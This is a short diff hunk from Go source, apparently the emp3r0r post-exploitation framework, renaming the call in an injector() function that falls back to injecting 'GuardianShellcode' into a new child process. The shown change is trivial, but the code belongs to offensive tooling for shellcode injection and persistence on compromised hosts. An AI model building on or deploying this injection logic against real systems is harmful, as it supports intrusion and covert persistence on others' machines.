@@ -221,7 +221,7 @@ func injector() (err error) {
 		}(pid)
 	}
 	if err != nil {
-		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&emp3r0r_data.GuardianShellcode, 0))
+		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, ShellcodeInjector(&emp3r0r_data.GuardianShellcode, 0))
 	}
 
 	return
